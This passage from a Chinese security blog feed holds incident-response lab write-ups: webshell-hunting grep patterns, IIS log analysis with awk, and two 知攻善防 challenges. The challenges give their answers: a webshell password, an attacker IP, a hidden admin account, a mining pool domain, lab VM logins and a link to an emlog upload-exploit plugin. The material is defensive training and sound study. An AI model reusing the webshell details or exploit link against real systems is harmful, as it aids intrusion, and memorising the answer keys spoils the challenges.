&lt;li>&lt;strong>找webshell地址&lt;/strong>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//搜索目录下适配当前应用的网页文件，查看内容是否有Webshell特征
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">find&lt;/span> &lt;span class="o">./&lt;/span> &lt;span class="nx">type&lt;/span> &lt;span class="nx">f&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">name&lt;/span> &lt;span class="s2">&amp;#34;*.jsp&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">xargs&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="s2">&amp;#34;exec(&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">find&lt;/span> &lt;span class="o">./&lt;/span> &lt;span class="nx">type&lt;/span> &lt;span class="nx">f&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">name&lt;/span> &lt;span class="s2">&amp;#34;*.php&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">xargs&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="s2">&amp;#34;eval(&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">find&lt;/span> &lt;span class="o">./&lt;/span> &lt;span class="nx">type&lt;/span> &lt;span class="nx">f&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">name&lt;/span> &lt;span class="s2">&amp;#34;*.asp&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">xargs&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="s2">&amp;#34;execute(&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">find&lt;/span> &lt;span class="o">./&lt;/span> &lt;span class="nx">type&lt;/span> &lt;span class="nx">f&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">name&lt;/span> &lt;span class="s2">&amp;#34;*.aspx&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">xargs&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="s2">&amp;#34;eval(&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//对于免杀Webshell，可以查看是否使用编码
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">find&lt;/span> &lt;span class="o">./&lt;/span> &lt;span class="nx">type&lt;/span> &lt;span class="nx">f&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">name&lt;/span> &lt;span class="s2">&amp;#34;*.php&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">xargs&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="s2">&amp;#34;base64_decode&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol start="2">
&lt;li>&lt;strong>分析一下webshell是什么工具&lt;/strong>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">可以把代码复制出来进行查询&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">一般就是蚁剑，哥斯拉，等等&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol start="3">
&lt;li>&lt;strong>找隐藏webshell&lt;/strong>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">这个一般可以使用&lt;/span> &lt;span class="nx">ls&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">la&lt;/span> &lt;span class="nx">进行查看隐藏文件，主要需要细心找。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol start="4">
&lt;li>&lt;strong>找免杀码，看日志。&lt;/strong>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">access.log等等文件。
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【玄机靶场】日志分析-IIS日志分析</title><link>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-iis%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</link><pubDate>Fri, 05 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-iis%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</guid><description>&lt;img src="http://localhost:1313/images/41.webp" alt="Featured image of post 【玄机靶场】日志分析-IIS日志分析" />&lt;h1 id="简介">简介&lt;/h1>
&lt;p>用户名:server2012&lt;br>
密码:URSZf3A&lt;/p>
&lt;h1 id="flag1">flag1&lt;/h1>
&lt;p>&lt;strong>1.phpstudy-2018站点日志.(.log文件)所在路径，提供绝对路径&lt;/strong>&lt;br>
• &lt;strong>默认路径&lt;/strong>：&lt;code>%SystemDrive%\inetpub\logs\LogFiles\&lt;/code>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324193009.png" alt="Pasted image 20250324193009">&lt;br>
flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{C:\inetpub\logs\LogFiles\W3SVC2}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag2">flag2&lt;/h1>
&lt;p>&lt;strong>2.系统web日志中状态码为200请求的数量是多少？&lt;/strong>&lt;br>
下载日志文件 awk分析&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">awk &amp;#39;$12 == 200 &amp;#39; u_ex250220.log| wc -l
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324194157.png" alt="Pasted image 20250324194157">&lt;br>
flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="mi">2315&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag3">flag3&lt;/h1>
&lt;p>&lt;strong>3.系统web日志中出现了多少种请求方法&lt;/strong>&lt;br>
继续分析请求方式&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">awk &amp;#39;{print $4} &amp;#39; u_ex250220.log| sort| uniq -c
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324194228.png" alt="Pasted image 20250324194228">&lt;br>
flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{7}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag4">flag4&lt;/h1>
&lt;p>&lt;strong>4.存在文件上传漏洞的路径是什么(flag{/xxxxx/xxxxx/xxxxxx.xxx})&lt;/strong>&lt;br>
&lt;code>发现是emlog bing搜索emlog文件上传漏洞&lt;/code>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324194409.png" alt="Pasted image 20250324194409">&lt;br>
在日志文件中搜索&lt;code>/admin/plugin.php&lt;/code> 并且返回值为200的日志&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324194430.png" alt="Pasted image 20250324194430">&lt;br>
找到存在文件上传漏洞的php文件&lt;br>
flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{/emlog/admin/plugin.php}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag5">flag5&lt;/h1>
&lt;p>&lt;strong>5.攻击者上传并且利用成功的webshell的文件名是什么&lt;/strong>&lt;br>
打包下载源码 解压 火绒报毒&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324194518.png" alt="Pasted image 20250324194518">&lt;br>
在日志文件中搜索&lt;code>window.php&lt;/code>并且返回值为200&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">grep &amp;#34;window.php&amp;#34; u_ex250220.log | awk &amp;#39;$12==200
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324194534.png" alt="Pasted image 20250324194534">&lt;br>
也找到上传用的zip插件&lt;br>
&lt;a href="https://github.com/yangliukk/emlog/tree/main">https://github.com/yangliukk/emlog/tree/main&lt;/a>&lt;br>
flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">window&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">php&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【知攻善防靶场】web1</title><link>http://localhost:1313/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAweb1/</link><pubDate>Fri, 05 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAweb1/</guid><description>&lt;img src="http://localhost:1313/images/36.webp" alt="Featured image of post 【知攻善防靶场】web1" />&lt;h1 id="前提须知">前提须知&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">小李在值守的过程中&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">发现有CPU占用飙升&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">出于胆子小&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">就立刻将服务器关机&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">并找来正在吃苕皮的hxd帮他分析&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">这是他的服务器系统&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">请你找出以下内容&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">并作为通关条件&lt;/span>&lt;span class="err">：&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">1.&lt;/span>&lt;span class="nx">攻击者的shell密码&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">2.&lt;/span>&lt;span class="nx">攻击者的IP地址&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">3.&lt;/span>&lt;span class="nx">攻击者的隐藏账户名称&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">4.&lt;/span>&lt;span class="nx">攻击者挖矿程序的矿池域名&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">仅域名&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">5.&lt;/span>&lt;span class="nx">有实力的可以尝试着修复漏洞&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>虚拟机账号/密码:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">用户&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">administrator&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">密码&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">Zgsf&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">admin&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">com&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="1-攻击者的shell密码">1. 攻击者的shell密码&lt;/h1>
&lt;p>Webshell后门检查：&lt;br>
这里推荐使用D盾/河马查杀来检查webshell后门。&lt;br>
登录系统后，找到web源码地址，上传D盾直接扫描web源码地址，可以看出扫出一个&lt;strong>shell.php&lt;/strong>后门文件。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301195404.png" alt="Pasted image 20250301195404">&lt;br>
打开shell.php文件，查看源码，获取连接密码。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301195428.png" alt="Pasted image 20250301195428">&lt;br>
&lt;strong>答案：rebeyond&lt;/strong>&lt;/p>
&lt;h1 id="2-攻击者的ip地址">2. 攻击者的IP地址&lt;/h1>
&lt;p>查看日志信息，确定攻击者的IP地址。&lt;br>
查看/分析 Apache日志可以看出攻击IP。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301195511.png" alt="Pasted image 20250301195511">&lt;br>
&lt;strong>答案：192.168.126.1&lt;/strong>&lt;/p>
&lt;h1 id="3-攻击者的隐藏账户名称">3. 攻击者的隐藏账户名称&lt;/h1>
&lt;p>使用克隆工具，检查账号信息，确定是否存在未知管理员权限的用户信息。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301195550.png" alt="Pasted image 20250301195550">&lt;br>
&lt;strong>答案：hack168$&lt;/strong>&lt;/p>
&lt;h1 id="4攻击者挖矿程序的矿池域名">4.攻击者挖矿程序的矿池域名&lt;/h1>
&lt;p>登录&lt;strong>hack168$用户&lt;/strong>，看到一个Kuang.exe文件,发现是pyinstaller打包的exe文件,使用pyinstxtractor进行反编译。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="err">#&lt;/span>&lt;span class="nx">pyinstxtractor项目地址&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//github.com/extremecoders-re/pyinstxtractor&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">挖矿病毒与反编译脚本放在一个文件夹&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">执行&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">python&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="err">\\&lt;/span>&lt;span class="nx">pyinstxtractor&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="err">\\&lt;/span>&lt;span class="nx">Kuang&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">exe&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301195647.png" alt="Pasted image 20250301195647">&lt;br>
得到一个反编译好的文件夹，找到一个pyc的文件，Pytpyc文件是Python编译后的字节码文件，通常用于提高加载模块时的速度。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301195728.png" alt="Pasted image 20250301195728">&lt;br>
使用在线pyc反编译工具，得到源码&lt;br>
使用在线网站即可：&lt;br>
&lt;a href="https://www.lddgo.net/string/pyc-compile-decompile">https://www.lddgo.net/string/pyc-compile-decompile&lt;/a>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301195814.png" alt="Pasted image 20250301195814">&lt;br>
&lt;strong>答案&lt;/strong>：&lt;br>
&lt;strong>URL&lt;/strong>：&lt;a href="http://wakuang.zhigongshanfang.top">http://wakuang.zhigongshanfang.top&lt;/a>&lt;br>
&lt;strong>域名&lt;/strong>：wakuang.zhigongshanfang.top&lt;/p>
&lt;h1 id="5-全部答案">5. 全部答案&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">rebeyond&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">192.168.126.1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">hack168&lt;/span>&lt;span class="err">$&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">wakuang&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">zhigongshanfang&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">top&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【知攻善防靶场】web2</title><link>http://localhost:1313/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAweb2/</link><pubDate>Fri, 05 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAweb2/</guid><description>&lt;img src="http://localhost:1313/images/37.webp" alt="Featured image of post 【知攻善防靶场】web2" />&lt;h1 id="前提须知">前提须知&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="mf">1.&lt;/span>&lt;span class="nx">攻击者的&lt;/span> &lt;span class="nx">IP&lt;/span> &lt;span class="nx">地址&lt;/span>&lt;span class="err">（&lt;/span>&lt;span class="nx">两个&lt;/span>&lt;span class="err">）&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">2.&lt;/span>&lt;span class="nx">攻击者的&lt;/span> &lt;span class="nx">webshell&lt;/span> &lt;span class="nx">文件名&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">3.&lt;/span>&lt;span class="nx">攻击者的&lt;/span> &lt;span class="nx">webshell&lt;/span> &lt;span class="nx">密码&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">4.&lt;/span>&lt;span class="nx">攻击者的&lt;/span> &lt;span class="nx">QQ&lt;/span> &lt;span class="nx">号&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">5.&lt;/span>&lt;span class="nx">攻击者的服务器伪&lt;/span> &lt;span class="nx">IP&lt;/span> &lt;span class="nx">地址&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">6.&lt;/span>&lt;span class="nx">攻击者的服务器端口&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">7.&lt;/span>&lt;span class="nx">攻击者是如何入侵的&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">8.&lt;/span>&lt;span class="nx">攻击者的隐藏用户名&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>虚拟机账号/密码：&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">账号&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">Administrator&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">密码&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">Zgsf&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">qq&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">com&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="2攻击者的-webshell-文件名">2.攻击者的 webshell 文件名&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">首先登录到系统&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">可以看到有一个phpstudy小皮面板&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">就存在搭建的网站&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301200012.png" alt="Pasted image 20250301200012">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
